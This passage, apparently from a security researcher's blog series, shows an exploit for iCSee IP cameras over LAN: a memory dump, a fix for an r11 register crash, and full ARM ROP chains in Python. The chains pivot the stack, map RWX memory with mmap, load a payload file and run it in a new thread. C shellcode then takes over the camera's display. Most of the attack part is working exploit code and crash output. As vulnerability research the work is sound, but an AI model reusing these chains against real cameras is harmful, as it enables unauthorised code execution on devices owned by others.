0xb2bf3fb0:	0x00000000	0x00000000	0x00000000	0x00000000
0xb2bf3fc0:	0x00000000	0x00000000	0x00000000	0x00000000
0xb2bf3fd0:	0x008fcf20	0x00000001	0x0000001a	0x00249680
0xb2bf3fe0:	0x005ddc29	0xffffffe0	0x00000001	0x00000000
0xb2bf3ff0:	0x0221c2c8	0xda62c198	0xda62c198	0xb2bf401c
0xb2bf4000:	0xffffffe0	0x0001f698	0xb6fba710	0x000252b0
0xb2bf4010:	0x00000000	0x0008018c	0xb2bf421c	0x006cb3f4
0xb2bf4020:	0x00000001	0x00000000	0xb2bf421c	0x024cf35c
0xb2bf4030:	0x024f1088	0x00081338	0x41000199	0x00000001
0xb2bf4040:	0x00000000	0x00000000	0x00000000	0xb2bf4b00
0xb2bf4050:	0x00000000	0x00000000	0x00000000	0x00000000
0xb2bf4060:	0x00000000	0x00000000	0x00000000	0xb6f14f14
0xb2bf4070:	0x00000000	0x00000000	0x00000000	0xb2bf40cc
0xb2bf4080:	0xffffffff	0x6c6c6568	0xb2bf006f	0x61616161
0xb2bf4090:	0x61616161	0x61616161	0x0000001a	0x0000002a
0xb2bf40a0:	0xb6e5203c	0x41414141	0x41414141	0xb6e2f944
0xb2bf40b0:   !0xb6e52070!   0x41414141	0x41414141	0xb6e04ea0
0xb2bf40c0:	0x41414141	0x41414141	0x41414141	0xb6e1b524
0xb2bf40d0:	0x41414141	0xb6e52078	0x41414141	0x41414141
0xb2bf40e0:	0x41414141	0xb6e28854	0x41414141	0xb6e19bc4
0xb2bf40f0:	0xb6e5207c	0x41414141	0x41414141	0x41414141
0xb2bf4100:	0x41414141	0xb6e28854	0x41414141	0xb6e06c44
0xb2bf4110:	0x42424242	0x42424242	0x42424242	0x42424242
0xb2bf4120:	0x42424242	0x42424242	0x42424242	0x42424242
0xb2bf4130:	0x42424242	0xb6e52080	0xb6f1962c	0xb6ed7970
0xb2bf4140:	0x41414141	0x41414141	0x41414141	0x41414141
0xb2bf4150:	0x41414141	0xb6e28854	0x41414141	0xb6e3d1a0
```

Can you spot the match? The **r11** value *0xb6e2f944* from the crash dump is just before the stack pointer! And if we take a look at the last gadget we are currently using in the chain:

```
0010a6bc sub sp,r11,#0x0 ; ldr r11,[sp],#0x4 ; bx lr
```

We can see that after the stack pivot we load **r11** from the **sp** and increment it by *0x4* to get to the same stack pointer value we had before entering the function. 

But where does this **r11** value come from? If we take a look at a snippet from the first ROP-chains first few elements:

```
rop_chain += p32(storage_address - 0x34) # r4 - location where r1 will be saved
rop_chain += p32(0x41414141) # r5
rop_chain += p32(0x41414141) # r6
rop_chain += p32(libc_base_addr_int + 0x3f944) # pc <- !!!!!!!!!!!!!!!!!
```

The last four digits match up, so we are actually setting the value of **r11** to the address of the first gadget we have - meaning we are in fact both clobbering an important register, and also destroying something important on the stack for our ROP-chain. From the first clue, this must imply that if we simply save off the initial **r11** value, and save it to the position on the stack that it is re-loaded from. The values of **r4/r0/r1** will be correct and the crash will no longer occur!

# Modifying the ROP-chain

Now lets test our theory and see if fixing up **r11** works.

## Stage 1

The only modification I needed to do here was to save off **r11**, annoyingly I couldn't find any gadgets in either *libc* or *libc++* to help with this, so I ended up stealing one from **libdvr.so** (another shared library the device uses):

```
libdvr: 0002f878 cpy r0,r11 ; mov r1,#0x1 ; blx r3
```

Then it was just a matter of saving it at a known address in *libc*'s address space:

```
libc: 00048854 str r0,[r4,#0x0] ; ldmia sp!,{r4,pc}
```

## Stage 2

Now in stage 2, all we need to do is reload the value from the known address, and store it at the reloaded stack pointer (as it is incremented by four in the gadget anyway which has been accounted for), these gadgets did the job:

```
Sofia: 000d431c ldr r3,[r4,#0xc]; str r3,[r4,#0x8]; ldmia sp!,{r4,pc}
libc++ : 0006541c str r3,[r0,#0x0] ; ldmia sp!,{r3,pc}
```

## Does it work?

![no_crash_demo.gif](/assets/images/icsee_cameras/p7/no_crash_demo.gif)

It works! In the demo above, I first send a system info request, then the exploit which triggers the stack pivot (and subsequent pivot back) without crashing, then I send another system info request to prove the process is still alive.

![so_back.jpeg](/assets/images/icsee_cameras/p7/so_back.jpeg)

## Final Chains

Now that I know **r11** was the culprit, I tidied up the chains and removed some of the register backups to make things easier to follow (no point in backing up registers that don't mess anything up). Here is the first chain we execute (that can't contain null bytes):

```python
rop_chain = b"a" * 20

# we only need to save `r10` and r11 (r10 for stack locator, r11 for fixup)
# scratch buffer at varying offsets of libc_base + 0x62120

rop_chain += p32(storage_address + 0x18) # r4 - location where r1 will be saved
rop_chain += p32(0xdeadbeef) # r5
rop_chain += p32(0xdeadbeef) # r6
rop_chain += p32(libc_base_addr_int + 0x16cd8) # pc <- r11 gets loaded from this exact location, so we need to save a register we can use to derive the actual (or find a pointer somewhere)

# libc: 00026cd8 ldmia sp!,{r3,pc}
rop_chain += p32(libc_base_addr_int + 0x38854) # r3
rop_chain += p32(libdvr_base_address_int + 0x1f878) # pc <- r11 gets loaded from this exact location, so we need to save a register we can use to derive the actual (or find a pointer somewhere)

# libdvr: 0002f878 cpy r0,r11 ; mov r1,#0x1 ; blx r3

# libc: 00048854 str r0,[r4,#0x0] ; ldmia sp!,{r4,pc}
rop_chain += p32(0xdeadbeef) # r4
rop_chain += p32(libc_base_addr_int + 0x16c44) # pc

# libc: 00026c44 cpy r0,r10 ; add sp,sp,#0x24 ; ldmia sp!,{r4,r5,r6,r7,r8,r9,r10,r11,pc}
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(0xc0ffeeee) # padding
rop_chain += p32(storage_address + 0x10) # r4 - location r10 will be stored
rop_chain += p32(libcpp_base_addr_int + 0x8d62c) # r5 - gets put into lr for later gadget
rop_chain += p32(libcpp_base_addr_int + 0x4b970) # r6 - for later gadget
rop_chain += p32(0xdeadbabe) # r7
rop_chain += p32(0xdeadbabe) # r8
rop_chain += p32(0xdeadbabe) # r9
rop_chain += p32(0xdeadbabe) # r10
rop_chain += p32(0xdeadbabe) # r11
rop_chain += p32(libc_base_addr_int + 0x38854) # pc

# libc: 00048854 str r0,[r4,#0x0] ; ldmia sp!,{r4,pc}
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(libc_base_addr_int + 0x4d1a0) # pc

# libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
rop_chain += p32(libc_base_addr_int + 0x63710) # r3 - needs to be valid writeable mem addr
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(xor_key) # r5 - goes into r1 as the XOR key
rop_chain += p32(libc_base_addr_int + 0x515c0) # pc

# libc: 000615c0 cpy lr,r1 ; str r1,[r3,#0x0] ; str r2,[r3,#0x4] ; ldmia sp!,{r4,pc}
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(libc_base_addr_int + 0x4d1a0) # pc

# libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
rop_chain += p32(sofia_gadget_xor) # r3 - XOR of the Sofia gadget address
rop_chain += p32(0xdecea5ed) # r4 - needs to be a valid memory address
rop_chain += p32(libc_base_addr_int + 0x22104) # r5 - gadget address for after second decode
rop_chain += p32(libc_base_addr_int + 0x4ca14) # pc

# libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
# now we have decoded sofia gadget in r3

# first populate lr for the return after the eor gadget
# libcpp: 0009d62c cpy r2,r5 ; blx r6

# libcpp: 0005b970 cpy lr,r2 ; moveq r0,#0x6 ; movne r0,#0x1 ; ldmia sp!,{r4,r5,pc}
rop_chain += p32(libc_base_addr_int + 0x63710) # r4 - needs to be a writeable memory address
rop_chain += p32(0xdecea5ed) # r5
rop_chain += p32(libcpp_base_addr_int + 0x5e3b0) # pc

# move sofia gadget into r2 to keep it safe (libstdc++.so gadget btw (make sure r4 writeable memory address))
# libcpp: 0006e3b0 add r2,r3,#0x34 ; add r3,r3,#0x20 ; str r2,[r4,#0xc] ; 
#       str r3,[r4,#0x8] ; add sp,sp,#0x8 ; ldmia sp!,{r4,r5,r6,r7,r8,pc}
rop_chain += p32(0xdecea5ed) # padding
rop_chain += p32(0xdecea5ed) # padding
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(xor_key) # r5 - goes into r1 as the xor key
rop_chain += p32(libc_base_addr_int + 0x17604) # r6 - for a later gadget
rop_chain += p32(0xdecea5ed) # r7
rop_chain += p32(0xfffffffc) # r8 - second part of http buffer address (basically a -4 due to overflow)
rop_chain += p32(libc_base_addr_int + 0x4d564) # pc

# now put the key back into the correct place (r4), put encoded buffer address into r3, r6 set earlier on (libstdc++.so
# libc : 0005d564 cpy r1,r5 ; ldmia sp!,{r3,r4,r5,pc}
rop_chain += p32(http_buffer_ptr_xor) # r3 - to be xor'ed
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(0xdecea5ed) # r5
rop_chain += p32(libc_base_addr_int + 0x4ca14) # pc

# libc: 0005ca14 eor r3,r3,r1 ; subs r0,r2,r0 ; sbc r1,r3,r1 ; bx lr
# now we have decoded http buffer address in r3 and decoded sofia gadget address in r2

# libc: 00032104 ldr r1,[r3,#0x0] ; blx r6
# now the actual address of the http buffer is in r1, and the sofia gadget is in r2

# libc: 00027604 cpy r0,r1; ldmia sp!,{r4,r5,pc}
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(0xdecea5ed) # r5
rop_chain += p32(libc_base_addr_int + 0x3cc50) # pc

# libc: 0004cc50 add r0,r0,#0x20 ; ldmia sp!,{r4,pc}
rop_chain += p32(0xdecea5ed) # r4
rop_chain += p32(libc_base_addr_int + 0x16cd8) # pc

# libc: 00026cd8 ldmia sp!,{r3,pc}
# get control of r3 back
rop_chain += p32(libc_base_addr_int + 0x50d08) # r3 - for later gadget
rop_chain += p32(libc_base_addr_int + 0x3e8d4) # pc

# libc: 0004e8d4 blx r2

# sofia: 003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3 <- sofia gadget

# libc: 00060d08 sub sp,r11,#0x4 ; ldmia sp!,{r11,pc} <- stack pivot completed
```

And here is the chain on the fake stack we pivot too in the HTTP buffer that pivots back to the correct stack position after:

```python
http_request = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7"

http_request += p32(0x41414141) # r11
http_request += p32(0x165e4) # pc

# need to pivot back to original stack after we have done what we wanted
# we need to load r10 which hints stack location

# 000165e4 ldmia sp!,{r4,pc}
http_request += p32(storage_address + 0x10 - 0x8) # r4 - location of r10
http_request += p32(0xfc21c) # pc

# 000fc21c ldr r0,[r4,#0x8] ; ldmia sp!,{r4,r5,r6,pc}
http_request += p32(r10_addition_value) # r4 - amount to add to r10 (for overflow)
http_request += p32(0x41414141) # r5 - address of r11 value
http_request += p32(0x41414141) # r6
http_request += p32(0x3dccac) # pc

# 003dccac add r0,r0,r4 ; ldmia sp!,{r4,pc}
http_request += p32(storage_address + 0x18 - 0xc) # r4 <- location of r11
http_request += p32(0xd431c) # pc

# 000d431c ldr r3,[r4,#0xc]; str r3,[r4,#0x8]; ldmia sp!,{r4,pc}
http_request += p32(0x41414141) # r4
http_request += p32(libcpp_base_addr_int + 0x5541c) # pc

# purpose of this is to get the correct r11 value reloaded at end of chain
# libc++ : 0006541c str r3,[r0,#0x0] ; ldmia sp!,{r3,pc}
http_request += p32(0x2c5f8) # r3
http_request += p32(0x2793ac) # pc

# 002793ac mov r1,#0x0 ; blx r3

# 0002c5f8 ldmia sp!,{r3,pc}
http_request += p32(0x1e690) # r3
http_request += p32(0x186150) # pc

# 00186150 cpy r8,r1 ; blx r3

# 0001e690 ldmia sp!,{r3,r4,r5,pc}
http_request += p32(libc_base_addr_int + 0x4d1a0) # r3
http_request += p32(0x41414141) # r4
http_request += p32(landing_address) # r5 - becomes lr - 0x184514 (another function deeper)
http_request += p32(0x3f43a8) # pc

# 003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3

# libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
http_request += p32(storage_address + 0x20) # r3 - some valid + writeable address
http_request += p32(0x41414141) # r4
http_request += p32(0x41414141) # r5
http_request += p32(libc_base_addr_int + 0x515c0) # pc

# libc: 000615c0 cpy lr,r1 ; str r1,[r3,#0x0] ; str r2,[r3,#0x4] ; ldmia sp!,{r4,pc}
http_request += p32(0xffffffff) # r4 <- some valid address
http_request += p32(0x10a6bc) # pc

# 0010a6bc sub sp,r11,#0x0 ; ldr r11,[sp],#0x4 ; bx lr
```

# Shellcode

Now to get shellcode execution!

## Mapping Executable Memory

Now that we can execute code via ROP, we should be able to map some executable memory and jump into it. To do this, we need to call something like **mmap(NULL, 0x1000, 7, 34, -1, 0);**, where the 7 indicates RWX permissions.

Here are the gadgets used to implement this call:

```python
################ call mmap #################
# r0 : 0x0
# r1 : size, so like 8k I guess for starters
# r2 : 7
# r3 : 34
# stack[0x0] : 0xffffffff
# stack[0x4] : 0x0

# 001b7a04 mov r0,#0x0; ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,pc}
http_request += p32(0x1b8534) # r3
http_request += p32(0x1baecc) # r4
http_request += p32(0x7) # r5 - argument 2
http_request += p32(0x4000) # r6 - argument 1
http_request += p32(0x1b8da8) # r7
http_request += p32(34) # r8 - argument 3
http_request += p32(0xdeadbeef) # r9
http_request += p32(0x19c30) # pc

# 00019c30 cpy r1,r6; blx r3

# 001b8534 cpy r2,r5; blx r4

# 001baecc cpy r3,r8; blx r7

# 001b8da8 ldmia sp!,{r4,pc}
http_request += p32(0x1117c) # r4 - address of mmap
http_request += p32(0x579038) # pc

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0xffffffff) # argument 4
http_request += p32(0x0) # argument 5
http_request += p32(password_scratch_buffer) # r4
http_request += p32(0x50c50) # pc
```

You can see the resulting address in **r0** in this crash dump:

```
$r0  : 0xb085c000  →  0x00000000
$r1  : 0x1000    
$r2  : 0x7       
$r3  : 0x22      
$r4  : 0x41414141 ("AAAA"?)
$r5  : 0x7       
$r6  : 0x1000    
$r7  : 0x001b8da8  →   pop {r4,  pc}
$r8  : 0x22      
$r9  : 0xdeadbeef
$r10 : 0xdeadbabe
$r11 : 0x41414141 ("AAAA"?)
$r12 : 0x0       
$sp  : 0x0174d6e8  →  0xb6e60128  →  "] Upload"
$lr  : 0x0057903c  →   add sp,  sp,  #8
$pc  : 0xbabebabc
$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
```

And can see the chunk of memory in the process memory map, proving we have mapped some memory with RWX permissions:

![rwx_memory.png](/assets/images/icsee_cameras/p7/rwx_memory.png)

## Dispatcher

Now we need to get some code into the memory we just mapped, and spawn a thread that executes the code. On the previous camera, we were able to write a dispatcher shellcode in C, so lets convert it to ROP for this camera. Feel free to work through the chain, but it pretty much does the same as the dispatcher payload except using **mmap** instead of **malloc**, and with the fixup on the end:

```python
################ call mmap #################
# r0 : 0x0
# r1 : size, so like 8k I guess for starters
# r2 : 7
# r3 : 34
# stack[0x0] : 0xffffffff
# stack[0x4] : 0x0

# 001b7a04 mov r0,#0x0; ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,pc}
http_request += p32(0x1b8534) # r3
http_request += p32(0x1baecc) # r4
http_request += p32(0x7) # r5 - argument 2
http_request += p32(0x4000) # r6 - argument 1
http_request += p32(0x1b8da8) # r7
http_request += p32(34) # r8 - argument 3
http_request += p32(0xdeadbeef) # r9
http_request += p32(0x19c30) # pc

# 00019c30 cpy r1,r6; blx r3

# 001b8534 cpy r2,r5; blx r4

# 001baecc cpy r3,r8; blx r7

# 001b8da8 ldmia sp!,{r4,pc}
http_request += p32(0x1117c) # r4 - address of mmap
http_request += p32(0x579038) # pc

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0xffffffff) # argument 4
http_request += p32(0x0) # argument 5
http_request += p32(password_scratch_buffer) # r4
http_request += p32(0x50c50) # pc

## now save the address of buffer in libc storage scratch buffer
# 00050c50 str r0,[r4,#0x0]; ldmia sp!,{r4,pc}
http_request += p32(password_scratch_buffer + 4) # r4 - address of file struct
http_request += p32(0x19930) # pc

## now we have the address of our payload buffer saved, do what the 
# dispatcher payload does in ROP (read main into file and 
# run it in a new thread)

# ############# create_file_struct ##############
# # use bytes [0x4-0x14] of the libc storage scratch buffer for the file struct

# 00019930 cpy r0,r4; ldmia sp!,{r4,pc}
http_request += p32(0x1e934) # r4 - address of create file struct function
http_request += p32(0x579038) # pc

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # padding
http_request += p32(password_scratch_buffer + 4) # r4 - address of file struct
http_request += p32(0x19930) # pc

############ open_file #############

# 00019930 cpy r0,r4; ldmia sp!,{r4,pc}
http_request += p32(0x41414141) # r4
http_request += p32(0x1ff7c4) # pc

# 001ff7c4 ldmia sp!,{r3,r4,r5,r6,r7,pc}
http_request += p32(0x1b8da8) # r3
http_request += p32(0x56224) # r4
http_request += p32(0x41414141) # r5
http_request += p32(0x41414141) # r6
http_request += p32(0x5c32c8) # r7 - goes into r1, address of payload path
http_request += p32(0x574190) # pc

# 00574190 cpy r1,r7; blx r4

# 00056224 mov r2,#0x0; blx r3

# 001b8da8 ldmia sp!,{r4,pc}
http_request += p32(0x1eb20) # r4 <- address of open_file
http_request += p32(0x579038) # pc

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # padding
http_request += p32(password_scratch_buffer + 4) # r4 - address of file struct
http_request += p32(0x200258) # pc

################ read_file ################

# 00200258 cpy r0,r4; ldmia sp!,{r3,r4,r5,r6,r7,pc}
http_request += p32(0x1b8534) # r3
http_request += p32(0x1b8da8) # r4
http_request += p32(0x4000) # r5
http_request += p32(password_scratch_buffer + 0x98) # r6
http_request += p32(0x41414141) # r7
http_request += p32(0x3ed780) # pc

# 003ed780 ldr r1,[r6,#-0x98]; blx r3

# 001b8534 cpy r2,r5; blx r4

# 001b8da8 ldmia sp!,{r4,pc}
http_request += p32(0x1e14c) # r4 <- address of read_file
http_request += p32(0x579038) # pc

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # padding
http_request += p32(password_scratch_buffer + 4) # r4 - address of file struct
http_request += p32(0x19930) # pc

# ############### close_file #################
# 00019930 cpy r0,r4; ldmia sp!,{r4,pc}
http_request += p32(0x1e394) # r4 <- address of close file
http_request += p32(0x579038) # pc 

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # padding
http_request += p32(username_scratch_buffer) # r4 - address of thread structure
http_request += p32(0x19930) # pc

############# pthread_create (0x10c90) ################

# 00019930 cpy r0,r4; ldmia sp!,{r4,pc}
http_request += p32(0x41414141) # r4
http_request += p32(0x1b7a08) # pc

# 001b7a08 ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,pc}
http_request += p32(0xd083c) # r3
http_request += p32(0x10c90) # r4 <- address of pthread create
http_request += p32(password_scratch_buffer - 0x4) # r5 - argument 2 pointer
http_request += p32(0x0) # r6 - argument 1
http_request += p32(0x49c28) # r7
http_request += p32(0x579038) # r8
http_request += p32(0xdeadbeef) # r9
http_request += p32(0x19c30) # pc

# 00019c30 cpy r1,r6; blx r3

# 000d083c ldr r2,[r5,#0x4]; mov r3,#0x4; blx r7

# 00049c28 mov r3,#0x0; blx r8

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # padding
http_request += p32(username_scratch_buffer - 0x4) # r4 <- address of thread structure
http_request += p32(0xd1f44) # pc

############# pthread_detach (0x1213c) ################

# 000d1f44 ldr r0,[r4,#0x4]; ldmia sp!,{r4,pc}
http_request += p32(0x1213c) # r4 <- address of pthread detach
http_request += p32(0x579038) # pc

# 00579038 blx r4; add sp,sp,#0x8; ldmia sp!,{r4,pc} <- function call gadget!
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # padding
http_request += p32(0x41414141) # r4 <- address of thread structure
http_request += p32(0x165e4) # pc

########################################
############ FIXUP CHAIN ###############
########################################

# need to pivot back to original stack after we have done what we wanted
# we need to load r10 which hints stack location

# 000165e4 ldmia sp!,{r4,pc}
http_request += p32(storage_address + 0x20 - 0x8) # r4 - location of r10
http_request += p32(0xfc21c) # pc

# 000fc21c ldr r0,[r4,#0x8] ; ldmia sp!,{r4,r5,r6,pc}
http_request += p32(r10_addition_value) # r4 - amount to add to r10 (for overflow)
http_request += p32(0x41414141) # r5 - address of r11 value
http_request += p32(0x41414141) # r6
http_request += p32(0x3dccac) # pc

# 003dccac add r0,r0,r4 ; ldmia sp!,{r4,pc}
http_request += p32(storage_address + 0x24 - 0xc) # r4 <- location of r11
http_request += p32(0xd431c) # pc

# 000d431c ldr r3,[r4,#0xc]; str r3,[r4,#0x8]; ldmia sp!,{r4,pc}
http_request += p32(0x41414141) # r4
http_request += p32(libcpp_base_addr_int + 0x5541c) # pc

# purpose of this is to get the correct r11 value reloaded at end of chain
# libc++ : 0006541c str r3,[r0,#0x0] ; ldmia sp!,{r3,pc}
http_request += p32(0x2c5f8) # r3
http_request += p32(0x2793ac) # pc

# 002793ac mov r1,#0x0 ; blx r3

# 0002c5f8 ldmia sp!,{r3,pc}
http_request += p32(0x1e690) # r3
http_request += p32(0x186150) # pc

# 00186150 cpy r8,r1 ; blx r3

# 0001e690 ldmia sp!,{r3,r4,r5,pc}
http_request += p32(libc_base_addr_int + 0x4d1a0) # r3
http_request += p32(0x41414141) # r4
http_request += p32(landing_address) # r5 - becomes lr - 0x184514 (another function deeper)
http_request += p32(0x3f43a8) # pc

# 003f43a8 add r11,r0,r8 ; cpy r0,r6 ; blx r3

# libc: 0005d1a0 cpy r1, r5; ldmia sp!,{r3,r4,r5,pc}
http_request += p32(storage_address + 0x20) # r3 - some valid + writeable address
http_request += p32(0x41414141) # r4
http_request += p32(0x41414141) # r5
http_request += p32(libc_base_addr_int + 0x515c0) # pc

# libc: 000615c0 cpy lr,r1 ; str r1,[r3,#0x0] ; str r2,[r3,#0x4] ; ldmia sp!,{r4,pc}
http_request += p32(0xffffffff) # r4 <- some valid address
http_request += p32(0x10a6bc) # pc

# 0010a6bc sub sp,r11,#0x0 ; ldr r11,[sp],#0x4 ; bx lr
```

Phew that was a long chain! Now all we need to do is upload our shellcode into **/var/tmp/mmcblock0/iperf/iperf** with the file write primitive, and this should be executed in a separate thread!

I ported the screen flash payload first to make sure that it works:

![flash_test.gif](/assets/images/icsee_cameras/p7/flash_test.gif)

Cool! So after jumping through all of those hoops, we've finally managed to get shellcode running on this other camera variant - although it does have some reliability issues and only works about 50% of the time (not sure why, seems to crash randomly in *libc* so I'm probably causing some sort of accidental race condition). 

## Screen

On this camera, the code that manages the screen is very different and directly interfaces with the **/dev/spi_lcd** device using **ioctl** calls rather than using a shared library like the other camera. 

Fortunately it wasn't too much of a pain to port over once I found pointers to the pair of framebuffers, giving us full control of the screen!

### RGB

To prove I have control of the display, I modified the RGB example from the previous camera to use the new screen-drawing method:

```c
#include <stdint.h>

#define SetLuminance_ADDR 0x1b0e0
#define GraphicsFlush_ADDR 0x318a78
#define SLEEP_ADDR 0x10f3c
#define MALLOC_ADDR 0x11734
#define MEMCPY_ADDR 0x118cc

typedef int SetLuminance_t(uint32_t luminance);
typedef void GraphicsFlush_t(int thing);
typedef uint32_t sleep_t(uint32_t seconds);

int _start(void) {
    SetLuminance_t *SetLuminance = (SetLuminance_t *) SetLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;
    GraphicsFlush_t *GraphicsFlush = (GraphicsFlush_t *) GraphicsFlush_ADDR;

    // overwrite draw to screen callback in struct at 

    uint32_t height = 320;
    uint32_t width = 240;
    uint32_t num_pixels = height * width;  // Total number of pixels

    uint8_t color_state = 0;  // 0=red, 1=green, 2=blue

    uint16_t* other_buffer_ptr = *(uint16_t**) 0x6d47d8;
    uint16_t* buffer_select_flag = (uint16_t*) 0x699aa5;

    // inidcate we are running code for convenience
    SetLuminance(0x46);
    sleep(1);
    SetLuminance(0x0);
    sleep(1);

    // overwrite the display update callback
    uint32_t* weird_struct = *(uint32_t**) 0x6d47f4;
    weird_struct[0xf] = 0x1a630; // immediately return

    uint32_t* graphics_struct = (uint32_t*) 0x699aa5;
    
    while(1) {
        SetLuminance(0x46);

        *buffer_select_flag = 0x0;

        // Fill buffer with current color
        for(uint32_t i = 0; i < num_pixels; i++) {
            switch(color_state) {
                case 0: // Red
                    other_buffer_ptr[i] = 0xF800;
                    break;
                case 1: // Green
                    other_buffer_ptr[i] = 0x07E0;
                    break;
                case 2: // Blue
                    other_buffer_ptr[i] = 0x001F;
                    break;
            }
        }

        // ioctl_thing(0, 0, width, height, *test_buffer);
        GraphicsFlush(*graphics_struct);
    
        sleep(1);
        
        // Cycle to next color
        color_state = (color_state + 1) % 3;
    }

    return 0;
}
```

And here is the result:

![rgb_test.gif](/assets/images/icsee_cameras/p7/rgb_test.gif)


### ImageDisplay

Next, I ported the image display payload from the other camera so we can display arbitrary images. The following *ffmpeg* command will convert an image to something that is properly displayed on the camera:

```
ffmpeg -i image.png -vf scale=240:320 -c:v rawvideo -pix_fmt rgb565be -f rawvideo image.raw
```

Here is the payload for that:

```c
#include <stdint.h>

#define SetLuminance_ADDR 0x1b0e0
#define GraphicsFlush_ADDR 0x318a78
#define SLEEP_ADDR 0x10f3c
#define MALLOC_ADDR 0x11734
#define MEMCPY_ADDR 0x118cc

#define CREATE_FILE_STRUCT_ADDR 0x1e934
#define OPEN_FILE_ADDR 0x1eb20
#define READ_FILE_ADDR 0x1e14c
#define CLOSE_FILE_ADDR 0x1e394

typedef int SetLuminance_t(uint32_t luminance);
typedef void GraphicsFlush_t(int thing);
typedef uint32_t sleep_t(uint32_t seconds);
typedef void* (*malloc_t)(uint32_t size);
typedef void* (*memcpy_t)(void* src, void* dst, uint32_t size);

struct file_struct {
    void* json_function_table;
    void* structure;
};

typedef struct file_struct* (*create_file_struct_t)(struct file_struct*);
typedef int (*open_file_struct_t)(struct file_struct*, char*, uint32_t);
typedef int (*read_file_t)(struct file_struct*, void* buffer, uint32_t count);
typedef int (*close_file_t)(struct file_struct*);

int _start(void) {
    SetLuminance_t *SetLuminance = (SetLuminance_t *) SetLuminance_ADDR;
    sleep_t *sleep = (sleep_t*) SLEEP_ADDR;
    GraphicsFlush_t *GraphicsFlush = (GraphicsFlush_t *) GraphicsFlush_ADDR;
    malloc_t malloc = (malloc_t) MALLOC_ADDR;
    memcpy_t memcpy = (memcpy_t) MEMCPY_ADDR;

    create_file_struct_t create_file_struct = (create_file_struct_t) CREATE_FILE_STRUCT_ADDR;
    open_file_struct_t open_file_struct = (open_file_struct_t) OPEN_FILE_ADDR;
    read_file_t read_file = (read_file_t) READ_FILE_ADDR;
    close_file_t close_file = (close_file_t) CLOSE_FILE_ADDR;

    // overwrite draw to screen callback in struct at 

    uint32_t height = 320;
    uint32_t width = 240;
    uint32_t num_pixels = height * width;  // Total number of pixels
    uint32_t buffer_size = height * width * 2;

    uint16_t* our_buffer = (uint16_t*) malloc(buffer_size);

    uint16_t* other_buffer_ptr = *(uint16_t**) 0x6d47d8;
    uint16_t* buffer_ptr = *(uint16_t**) 0x6d47dc;
    uint16_t* buffer_select_flag = (uint16_t*) 0x699aa5;

    // inidcate we are running code for convenience
    SetLuminance(0x46);
    sleep(1);
    SetLuminance(0x0);
    sleep(1);

    // overwrite the display update callback
    uint32_t* weird_struct = *(uint32_t**) 0x6d47f4;
    weird_struct[0xf] = 0x1a630; // immediately return

    uint32_t* test_thing = (uint32_t*) 0x699aa5;

    struct file_struct file_desc;
    create_file_struct(&file_desc);

    int fd = open_file_struct(&file_desc, "/var/tmp/mmcblock0/iperf/image", 0x0);

    *buffer_select_flag = 0x0;

    read_file(&file_desc, our_buffer, buffer_size);
    close_file(&file_desc);
    
    while(1) {
        SetLuminance(0x46);

        *buffer_select_flag = 0x0;

        // Fill buffer with current color
        for(uint32_t i = 0; i < num_pixels; i++) {
            other_buffer_ptr[i] = our_buffer[i];
        }

        // ioctl_thing(0, 0, width, height, *test_buffer);
        GraphicsFlush(*test_thing);
    
        sleep(1);
    }

    return 0;
}
```

And here is the result!

![image_demo.jpg](/assets/images/icsee_cameras/p7/image_demo.jpg)

# Conclusion

I won't be taking this exploit on this particular camera any further as I think I have had my fun with it (and the exploit for the other camera is far more stable). However, I've proven that it is possible to get code execution on basically any iCSee camera via LAN. Thanks for following along!